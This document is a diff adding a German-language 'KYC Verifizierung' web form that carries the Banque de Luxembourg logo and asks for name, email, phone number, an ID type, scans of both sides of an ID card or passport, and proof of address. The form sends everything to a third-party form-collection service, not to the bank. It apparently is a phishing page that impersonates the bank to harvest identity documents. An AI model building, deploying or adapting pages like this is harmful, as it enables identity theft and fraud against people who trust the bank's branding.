@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>KYC Verifizierung</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --blue: #0066ff;
+      --bg-gray: #f5f5f5;
+      --text-dark: #222;
+      --border: #dcdcdc;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: var(--bg-gray);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .form-container {
+      background-color: #fff;
+      padding: 40px 50px;
+      border-radius: 10px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+    }
+
+    .logo {
+      display: block;
+      margin: 0 auto 20px;
+      width: 80px;
+    }
+
+    h2 {
+      font-size: 1.2rem;
+      color: var(--text-dark);
+      font-weight: 700;
+      margin-bottom: 30px;
+    }
+
+    label {
+      display: block;
+      font-size: 0.9rem;
+      font-weight: 600;
+      color: var(--text-dark);
+      text-align: left;
+      margin-bottom: 6px;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 10px 12px;
+      border: 1px solid var(--border);
+      border-radius: 5px;
+      font-size: 0.95rem;
+      margin-bottom: 16px;
+      background-color: #fafafa;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      font-size: 1rem;
+      font-weight: 600;
+      border-radius: 6px;
+      border: 2px solid var(--blue);
+      background-color: transparent;
+      color: #777;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    button:hover {
+      color: var(--blue);
+    }
+  </style>
+</head>
+<body>
+  <div class="form-container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/4a/Banque_de_Luxembourg_logo.svg" alt="Banque de Luxembourg" class="logo">
+    <h2>KYC Verifizierung</h2>
+
+    <form action="https://formcarry.com/s/bcxrcp5wfYU" method="POST" enctype="multipart/form-data">
+      <label for="fullname">Vor- und Nachname</label>
+      <input type="text" id="fullname" name="VorUndNachname" required>
+
+      <label for="email">E-Mail-Adresse</label>
+      <input type="email" id="email" name="Email" required>
+
+      <label for="telefon">Telefonnummer</label>
+      <input type="tel" id="telefon" name="Telefonnummer" required>
+
+      <label for="ausweisart">Art des Ausweisdokuments</label>
+      <select id="ausweisart" name="Ausweisart" required>
+        <option value="">Bitte auswählen</option>
+        <option value="Personalausweis">Personalausweis</option>
+        <option value="Reisepass">Reisepass</option>
+      </select>
+
+      <label for="vorderseite">Vorderseite (Datei)</label>
+      <input type="file" id="vorderseite" name="Vorderseite" accept=".jpg,.jpeg,.png,.pdf" required>
+
+      <label for="rueckseite">Rückseite (Datei)</label>
+      <input type="file" id="rueckseite" name="Rückseite" accept=".jpg,.jpeg,.png,.pdf">
+
+      <label for="addressProof">Adressnachweis</label>
+      <input type="file" id="addressProof" name="Adressnachweis" accept=".pdf,.jpg,.jpeg,.png">
+
+      <button type="submit">Absenden</button>
+    </form>
+  </div>
+</body>
+</html>
